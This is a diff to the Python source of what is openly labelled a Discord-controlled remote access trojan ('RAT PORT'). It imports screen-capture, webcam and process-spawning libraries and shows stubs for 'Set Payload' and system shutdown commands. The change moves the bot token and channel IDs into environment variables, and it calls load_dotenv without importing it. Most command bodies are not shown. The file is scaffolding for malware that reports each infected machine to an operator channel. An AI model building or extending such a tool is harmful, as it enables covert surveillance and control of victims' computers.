@@ -1,27 +1,18 @@
-import asyncio  # Library for writing asynchronous code using coroutines, event loops, and tasks.
-import ctypes  # Provides a way to call functions in dynamic link libraries/shared libraries and handle low-level data types.
-import os  # Interact with the operating system, including functionalities such as file and directory manipulation.
-import subprocess  # Allows spawning new processes, connecting to their input/output/error pipes, and obtaining their return codes.
-import sys  # Access to some variables used or maintained by the interpreter and functions that interact with the interpreter.
-import threading  # Provides high-level threading interface and primitives for multi-threading.
-import time  # Functions for working with time, including sleep and time measurement.
-import urllib.request  # Module for opening URLs and retrieving data from them.
+import asyncio
+import os
+import subprocess
+import sys
+import time
+import urllib.parse
+import urllib.request
 
-import cv2  # OpenCV library for computer vision and image processing.
-import requests  # Library for making HTTP requests.
-import shutil  # High-level file operations such as copying, moving, and deleting files and directories.
-import socket  # Provides low-level networking interface for communication across a network.
-import ssl  # Provides TLS/SSL encryption and certificate verification support.
-from datetime import datetime  # Class representing a date and time.
-from plyer import notification  # Library for displaying desktop notifications.
-import winreg  # Provides access to the Windows registry.
-import platform  # Provides an interface to various system information and operations.
-
-import discord  # Discord API library for creating bots and interacting with the Discord platform.
-from discord.ext import commands  # Extension module for creating bot commands in Discord.
-import pyautogui  # Library for GUI automation and screen recording.
-import re  # Regular expression operations for pattern matching and manipulation.
-import uuid  # Module for generating and working with universally unique identifiers (UUIDs).
+import cv2
+import discord
+from discord.ext import commands
+import io
+import pyautogui
+import requests
+import ssl
 
 
 intents = discord.Intents.default()
@@ -30,7 +21,17 @@ intents.presences = False
 intents.guild_messages = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
-activity = discord.Activity(type=discord.ActivityType.listening, name='RAT PORT') # Change "RAT PORT" Bot Activity 
+
+# Load environment variables from .env file
+load_dotenv()
+
+async def on_ready():
+    # Retrieve the BOT_ACTIVITY environment variable
+    bot_activity = os.getenv('BOT_ACTIVITY')
+
+    # Set the bot's activity
+    activity = discord.Activity(type=discord.ActivityType.listening, name=bot_activity)
+    await bot.change_presence(activity=activity)
 
 # Command : Set Payload 
 @bot.command()
@@ -321,8 +322,10 @@ async def sys_shutdown(ctx):
 # Function to send a system active message
 async def send_system_active_message():
     await bot.wait_until_ready()
-    guild_id = xxxxxxxxxx  # Replace with your guild ID
-    channel_id = xxxxxxxxxx  # Replace with your channel ID
+
+    # Get channel and guild IDs from environment variables
+    guild_id = int(os.getenv('GUILD_ID'))
+    channel_id = int(os.getenv('CHANNEL_ID'))
 
     guild = bot.get_guild(guild_id)
     channel = guild.get_channel(channel_id)
@@ -335,4 +338,4 @@ async def send_system_active_message():
     except Exception as e:
         print(f"Error sending system active message: {e}")
 
-bot.run('YOUR_BOT_TOKEN') # Add You Discord Bot Token
+bot.run(os.getenv('BOT_TOKEN')) # Use the bot token from environment variable
